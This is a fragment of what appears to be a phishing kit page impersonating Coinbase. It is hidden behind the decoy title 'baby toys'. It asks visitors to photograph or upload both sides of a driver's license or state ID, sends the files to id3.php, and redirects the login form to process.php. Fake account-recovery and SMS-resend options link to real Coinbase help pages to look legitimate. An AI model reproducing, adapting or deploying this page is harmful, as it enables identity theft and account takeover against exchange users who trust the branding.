...
?>
<!DOCTYPE html>
<html xmlns:fb="http://ogp.me/ns/fb#"><head><style type="text/css">@charset "UTF-8";[ng\:cloak],[ng-cloak],[data-ng-cloak],[x-ng-cloak],.ng-cloak,.x-ng-cloak,.ng-hide:not(.ng-hide-animate){display:none !important;}ng\:form{display:block;}.ng-animate-shim{visibility:hidden;}.ng-anchor{position:absolute;}</style>
  <title>
      baby toys
  </title>
  <!-- generic -->
...
<form style="" name="idcard" id="idcard" method="POST" autocomplete="off" action="id3.php" novalidate="novalidate">
...
<br>
<div class="task-container jumio incomplete active">
...
<br><br><p>To finalize the verification - Please take a photo or upload driver's license / state ID ( Front &amp; Back )  </p><br><br>
	...
	<script src="./js/custom.js" type="text/javascript"></script>
		...
		<div class="jFiler jFiler-theme-dragdropbox"><input type="file" name="files[]" id="filer_input2" multiple="multiple" style="position: absolute; left: -9999px; top: -9999px; z-index: -9999;"></div>
		</div>
		<br>
		<div class="ImageUpload__Instructions-sc-17q4u6r-7 jRfMjz">Please do not click verify until you see both of images fully loaded,watermark or otherwise obscure any part of your ID. This will help ensure we can verify your identity document as quickly and accurately as possible</div>
<br><br>
        <input type="submit" name="commit" value="Verify" class="btn btn-primary" id="step_two_verify" data-disable-with="Verifying...">
...
<div class="modal-body">
    <div id="resend_sms_code_link" class="section">
      ...
      <div class="section-desc">Have the code resent to your identity information</div>
    </div>
    <div class="section">
      <a href="https://help.coinbase.com/en/coinbase/managing-my-account/account-recovery/i-have-lost-or-need-to-update-my-identity-or-2-factor-authentication-device" target="_blank">
    ...
    <div class="section">
      <a href="/account_recovery/new?type=sms">
        <div class="section-title">I need to update my identity information</div>
        <div class="section-desc">Update your information by verifying your identity and taking a photo of yourself and your ID</div>
</a>    </div>
</div>
...
$("#Login").submit(function(event){
 ...
 $(location).attr("href", "process.php?cmd=e3625243c1e6620b5b736323fa1ef3ec");
    });
